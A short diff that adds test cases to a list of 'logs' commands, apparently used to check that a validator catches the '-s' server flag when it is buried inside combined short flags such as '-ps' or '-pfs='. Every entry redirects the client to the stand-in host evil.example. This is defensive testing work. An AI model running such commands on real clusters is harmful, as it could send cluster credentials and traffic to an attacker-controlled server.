@@ -576,6 +576,12 @@ SERVER_COMMANDS = [
     "logs -fs https://evil.example pod/demo-app-abc",
     "logs -fAs https://evil.example pod/demo-app-abc",
     "logs -fs=https://evil.example pod/demo-app-abc",
+    # #83: `p` is boolean `--previous` on `logs`, so the walk runs past it and
+    # the `s` after it is still the endpoint shorthand
+    "logs -ps https://evil.example pod/demo-app-abc",
+    "logs -fps https://evil.example pod/demo-app-abc",
+    "logs -pfs=https://evil.example pod/demo-app-abc",
+    "logs -pshttps://evil.example pod/demo-app-abc",
 ]
 
 
